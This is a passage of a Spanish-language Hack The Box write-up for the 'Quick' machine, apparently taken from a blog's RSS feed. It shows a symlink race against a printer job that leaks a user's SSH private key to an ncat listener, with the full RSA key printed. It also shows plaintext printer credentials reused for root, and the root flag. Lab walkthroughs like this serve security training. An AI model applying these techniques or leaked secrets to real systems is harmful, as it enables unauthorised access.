-&lt;p&gt;Podemos aprovecharnos de este &lt;code&gt;sleep&lt;/code&gt;, para poder crearnos un archivo con el nombre de la fecha actual, y cuando se ejecute el &lt;code&gt;sleep&lt;/code&gt; puedo secuestrar el contenido original para crear un link simbolico que apunte a la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para ello ejecutare la siguente instrucción.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/printer$ while true; do fecha=$(date +%F_%H:%M:%S); if [ -r $fecha ]; then ln -s -f /home/srvadm/.ssh/id_rsa $fecha; break; fi; done
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Me pondre en escucha por el puerto &lt;code&gt;9100&lt;/code&gt; y agregare un contenido en &lt;code&gt;bill details&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Recibimos con exito la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::9100
-Ncat: Listening on 0.0.0.0:9100
-Ncat: Connection from 10.10.10.186.
-Ncat: Connection from 10.10.10.186:44256.
------BEGIN RSA PRIVATE KEY-----
-MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
-AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
-1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
-DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
-whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
-hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
-ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
-Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
-DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
-j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
-H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
-9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
-bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
-F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
-T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
-8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
-b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
-pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
-GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
-Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
-LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
-2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
-x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
-+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
-NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
------END RSA PRIVATE KEY-----
-VA#            
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora nos conectamos como el usario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ chmod 600 id_rsa
-❯ ssh -i id_rsa srvadm@10.10.10.186
-Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sat Jun 17 01:32:15 UTC 2023
-
-  System load:  0.18              Users logged in:                0
-  Usage of /:   73.4% of 7.75GB   IP address for ens33:           10.10.10.186
-  Memory usage: 17%               IP address for docker0:         172.17.0.1
-  Swap usage:   0%                IP address for br-9ef1bb2e82cd: 172.18.0.1
-  Processes:    191
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-52 packages can be updated.
-27 updates are security updates.
-
-
-Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129
-srvadm@quick:~$ whoami
-srvadm
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Dentro los dos directios del usuario &lt;code&gt;srvadm&lt;/code&gt;, encontramos un archivo de configuración y al leerlo encontramos unas credenciales.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ find .
-.
-./conf.d
-./conf.d/printers.conf
-./conf.d/cupsd.conf
-./logs
-./logs/debug.log
-./logs/error.log
-./logs/cups.log
-./packages
-./motd.legal-displayed
-srvadm@quick:~/.cache$ cat ./conf.d/printers.conf
-MakeModel KONICA MINOLTA C554SeriesPS(P)
-DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
-State Idle
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si ahora lo urldecodeamos para verlo mejor obtenemos unas nuevas credenciales que corresponden al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
-Interactive mode enabled
-
-php &amp;gt; echo urldecode(&quot;MakeModel KONICA MINOLTA C554SeriesPS(P)
-php &quot; DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
-php &quot; State Idle&quot;);
-MakeModel KONICA MINOLTA C554SeriesPS(P)
-DeviceURI https://srvadm@quick.htb:&amp;amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
-State Idle
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo unico que tenemos que hacer ahora es dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ su root
-Password: 
-root@quick:/home/srvadm/.cache# whoami
-root
-root@quick:/home/srvadm/.cache# cd /root/
-root@quick:~# cat root.txt 
-914fef2cca09448887142468da0f2136
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Maquina bastante guapa! 😃&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Quick</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Quick</guid>
-        
-        <category>http3</category>
-        
-        <category>Information leaked</category>
-        
-        <category>Bruteforce</category>
-        
-        <category>XSS Injection Esigate</category>
-        
-        <category>change password db</category>
-        
-        <category>Abusing Printer</category>
         
         
         <category>hackthebox</category>
